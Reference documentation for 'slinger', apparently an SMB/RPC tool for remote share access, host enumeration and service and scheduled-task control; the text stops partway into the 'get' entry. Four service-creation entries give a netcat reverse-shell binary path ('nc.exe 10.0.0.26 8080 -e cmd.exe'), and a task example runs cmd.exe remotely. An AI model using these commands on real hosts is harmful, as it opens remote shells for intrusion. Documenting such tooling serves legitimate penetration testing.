# CLI Commands Documentation

## `use`

**Description:** Connect to a specific share on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger use[0m [[32m-h[0m] [32mshare[0m
Connect to a specific share on the remote server
```

**Example Usage:**
```
Example Usage: use <sharename> | use C$
```

### Arguments

- **`share`**: Specify the share name to connect to
  - Required: Yes

---

## `ls`

**Description:** List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.

**Help:**
```
[1;34musage: [0m[1;35mslinger ls[0m [[32m-h[0m] [[32m-s [33m{name,size,created,lastaccess,lastwrite}[0m] [[36m--sort-reverse[0m] [[32m-l[0m] [[32m-r [33mdepth[0m] [[32m-o [33mfilename[0m] [[36m--show[0m] [[36m--type [33m{f,d,a}[0m] [32m[path][0m
List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: ls /path/to/directory
ls --type f -l          # List only files in long format
ls --type d             # List only directories
ls --type f -r 2        # Recursively list only files to depth 2
```

### Arguments

- **`path`**: Path to list contents, defaults to current path
  - Default: `.`
  - Required: No

- **`sort`**: Sort the directory contents by name, size, or date
  - Choices: name, size, created, lastaccess, lastwrite
  - Default: `date`
  - Required: No

- **`recursive`**: Recursively list directory contents with X depth
  - Required: No

- **`output`**: Save output to file
  - Required: No

- **`type`**: Filter by type: f=files only, d=directories only, a=all
  - Choices: f, d, a
  - Default: `a`
  - Required: No

---

## `find`

**Description:** Search for files and directories across the remote share with advanced filtering options.

**Help:**
```
[1;34musage: [0m[1;35mslinger find[0m [[32m-h[0m] [[36m--path [33mPATH[0m] [[36m--type [33m{f,d,a}[0m] [[36m--size [33mSIZE[0m] [[36m--mtime [33mMTIME[0m] [[36m--ctime [33mCTIME[0m] [[36m--atime [33mATIME[0m] [[36m--regex[0m] [[36m--iname[0m] [[36m--maxdepth [33mMAXDEPTH[0m] [[36m--mindepth [33mMINDEPTH[0m] [[36m--limit [33mLIMIT[0m]
                    [[36m--sort [33m{name,size,mtime,ctime,atime}[0m] [[36m--reverse[0m] [[36m--format [33m{table,list,paths,json}[0m] [[32m-o [33mOUTPUT[0m] [[36m--empty[0m] [[36m--hidden[0m] [[36m--progress[0m] [[36m--timeout [33mTIMEOUT[0m]
                    [32mpattern[0m
Search for files and directories across the remote share with advanced filtering options.
```

**Example Usage:**
```
Example Usage: find "*.txt" -path /Users -type f -size +1MB
```

### Arguments

- **`pattern`**: Search pattern (supports wildcards like *.txt or regex with -regex flag)
  - Required: Yes

- **`path`**: Starting search path (default: current directory)
  - Default: `.`
  - Required: No

- **`type`**: Search type: f=files only, d=directories only, a=all
  - Choices: f, d, a
  - Default: `a`
  - Required: No

- **`size`**: File size filter: +1MB (larger than), -100KB (smaller than), =5GB (exactly)
  - Required: No

- **`mtime`**: Modified within N days (positive number)
  - Required: No

- **`ctime`**: Created within N days (positive number)
  - Required: No

- **`atime`**: Accessed within N days (positive number)
  - Required: No

- **`maxdepth`**: Maximum search depth
  - Default: `2`
  - Required: No

- **`mindepth`**: Minimum search depth
  - Default: `0`
  - Required: No

- **`limit`**: Maximum number of results to return
  - Required: No

- **`sort`**: Sort results by field
  - Choices: name, size, mtime, ctime, atime
  - Default: `name`
  - Required: No

- **`format`**: Output format
  - Choices: table, list, paths, json
  - Default: `table`
  - Required: No

- **`output`**: Save results to file
  - Required: No

- **`timeout`**: Search timeout in seconds
  - Default: `120`
  - Required: No

---

## `shares`

**Description:** List all shares available on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger shares[0m [[32m-h[0m] [[32m-l[0m]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumshares`

**Description:** List all shares available on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger shares[0m [[32m-h[0m] [[32m-l[0m]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumpipes`

**Description:** Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.

**Help:**
```
[1;34musage: [0m[1;35mslinger enumpipes[0m [[32m-h[0m] [[36m--detailed[0m] [[36m--method [33m{smb,rpc,hybrid}[0m] [[36m--output [33mfilename[0m]
Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
```

**Example Usage:**
```
Example Usage: enumpipes --detailed --output pipes.txt
```

### Arguments

- **`method`**: Enumeration method to use
  - Choices: smb, rpc, hybrid
  - Default: `hybrid`
  - Required: No

- **`output`**: Save output to specified file
  - Required: No

---

## `cat`

**Description:** Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
[1;34musage: [0m[1;35mslinger cat[0m [[32m-h[0m] [32mremote_path[0m
Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cat /path/to/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to display contents
  - Required: Yes

---

## `cd`

**Description:** Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
[1;34musage: [0m[1;35mslinger cd[0m [[32m-h[0m] [32m[path][0m
Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cd /path/to/directory
```

### Arguments

- **`path`**: Directory path to change to, defaults to current directory
  - Default: `.`
  - Required: No

---

## `pwd`

**Description:** Print the current working directory on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger pwd[0m [[32m-h[0m]
Print the current working directory on the remote server
```

**Example Usage:**
```
Example Usage: pwd
```

---

## `exit`

**Description:** Exit the application

**Help:**
```
[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `quit`

**Description:** Exit the application

**Help:**
```
[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logout`

**Description:** Exit the application

**Help:**
```
[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logoff`

**Description:** Exit the application

**Help:**
```
[1;34musage: [0m[1;35mslinger exit[0m [[32m-h[0m]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `clear`

**Description:** Clear the screen

**Help:**
```
[1;34musage: [0m[1;35mslinger clear[0m [[32m-h[0m]
Clear the screen
```

**Example Usage:**
```
Example Usage: clear
```

---

## `help`

**Description:** Display help information for the application

**Help:**
```
[1;34musage: [0m[1;35mslinger help[0m [[32m-h[0m] [[36m--verbose[0m] [32m[cmd][0m
Display help information for the application
```

**Example Usage:**
```
Example Usage: help
```

### Arguments

- **`cmd`**: Specify a command to show help for
  - Required: No

---

## `reconnect`

**Description:** Reconnect to the server to fix broken pipe or connection errors

**Help:**
```
[1;34musage: [0m[1;35mslinger reconnect[0m [[32m-h[0m]
Reconnect to the server to fix broken pipe or connection errors
```

**Example Usage:**
```
Use this command when you encounter '[Errno 32] Broken pipe' errors
```

---

## `who`

**Description:** List the current sessions connected to the target host

**Help:**
```
[1;34musage: [0m[1;35mslinger who[0m [[32m-h[0m]
List the current sessions connected to the target host
```

**Example Usage:**
```
Example Usage: who
```

---

## `enumdisk`

**Description:** Enumerate server disk information

**Help:**
```
[1;34musage: [0m[1;35mslinger enumdisk[0m [[32m-h[0m]
Enumerate server disk information
```

**Example Usage:**
```
Example Usage: enumdisk
```

---

## `enumlogons`

**Description:** Enumerate users currently logged on the server

**Help:**
```
[1;34musage: [0m[1;35mslinger enumlogons[0m [[32m-h[0m]
Enumerate users currently logged on the server
```

**Example Usage:**
```
Example Usage: enumlogons
```

---

## `enuminfo`

**Description:** Enumerate detailed information about the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enuminfo[0m [[32m-h[0m]
Enumerate detailed information about the remote host
```

**Example Usage:**
```
Example Usage: enuminfo
```

---

## `enumsys`

**Description:** Enumerate system information of the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enumsys[0m [[32m-h[0m]
Enumerate system information of the remote host
```

**Example Usage:**
```
Example Usage: enumsys
```

---

## `enumtransport`

**Description:** Enumerate transport information of the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enumtransport[0m [[32m-h[0m]
Enumerate transport information of the remote host
```

**Example Usage:**
```
Example Usage: enumtransport
```

---

## `enumservices`

**Description:** Enumerate services on the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `servicesenum`

**Description:** Enumerate services on the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `svcenum`

**Description:** Enumerate services on the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `services`

**Description:** Enumerate services on the remote host

**Help:**
```
[1;34musage: [0m[1;35mslinger enumservices[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `serviceshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceshow[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `svcshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceshow[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `showservice`

**Description:** Show details of a specific service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceshow[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `servicestart`

**Description:** Start a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicestart[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `svcstart`

**Description:** Start a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicestart[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicerun`

**Description:** Start a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicestart[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicestop`

**Description:** Stop a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicestop[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `svcstop`

**Description:** Stop a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicestop[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `serviceenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `svcenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enableservice`

**Description:** Enable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enablesvc`

**Description:** Enable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceenable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `servicedisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `svcdisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disableservice`

**Description:** Disable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disablesvc`

**Description:** Disable a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedisable[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `servicedel`

**Description:** Delete a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedel[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `svcdelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedel[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `servicedelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger servicedel[0m [[32m-h[0m] ([32m-i [33mSERVICEID[0m | [32mservice_name[0m)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `serviceadd`

**Description:** Create a new service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svcadd`

**Description:** Create a new service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `servicecreate`

**Description:** Create a new service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svccreate`

**Description:** Create a new service on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger serviceadd[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-b [33mBINARY_PATH[0m [32m-d [33mDISPLAY_NAME[0m [32m-s [33m{auto,demand,system}[0m
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `enumtasks`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger enumtasks[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `tasksenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger enumtasks[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `taskenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger enumtasks[0m [[32m-h[0m] [[32m-n[0m] [[36m--filter [33mFILTER[0m]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `taskshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskshow[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `tasksshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskshow[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `showtask`

**Description:** Show details of a specific task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskshow[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `taskcreate`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskcreate[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-p [33mPROGRAM[0m [[32m-a [33mARGUMENTS[0m] [[32m-f [33mFOLDER[0m] [[32m-i [33mINTERVAL[0m] [[32m-d [33mDATE[0m]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskadd`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskcreate[0m [[32m-h[0m] [32m-n [33mNAME[0m [32m-p [33mPROGRAM[0m [[32m-a [33mARGUMENTS[0m] [[32m-f [33mFOLDER[0m] [[32m-i [33mINTERVAL[0m] [[32m-d [33mDATE[0m]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskrun`

**Description:** Run a specified task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskrun[0m [[32m-h[0m] [32mtask_path[0m
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskexec`

**Description:** Run a specified task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskrun[0m [[32m-h[0m] [32mtask_path[0m
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskdelete`

**Description:** Delete a specified task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskdelete[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `taskdel`

**Description:** Delete a specified task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskdelete[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `taskrm`

**Description:** Delete a specified task on the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger taskdelete[0m [[32m-h[0m] ([32m-i [33mTASK_ID[0m | [32mtask_path[0m)
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `time`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
[1;34musage: [0m[1;35mslinger time[0m [[32m-h[0m]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `enumtime`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
[1;34musage: [0m[1;35mslinger time[0m [[32m-h[0m]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `servertime`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
[1;34musage: [0m[1;35mslinger time[0m [[32m-h[0m]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `upload`

**Description:** Upload a file to the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger upload[0m [[32m-h[0m] [32mlocal_path[0m [32m[remote_path][0m
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `put`

**Description:** Upload a file to the remote server

**Help:**
```
[1;34musage: [0m[1;35mslinger upload[0m [[32m-h[0m] [32mlocal_path[0m [32m[remote_path][0m
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `download`

**Description:** Download a file from the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
[1;34musage: [0m[1;35mslinger download[0m [[32m-h[0m] [[36m--resume[0m] [[36m--restart[0m] [[36m--chunk-size [33mCHUNK_SIZE[0m] [32mremote_path[0m [32m[local_path][0m
Download a file from the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
  - Default: `64k`
  - Required: No

---

## `get`

**Description:** Download a file from the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
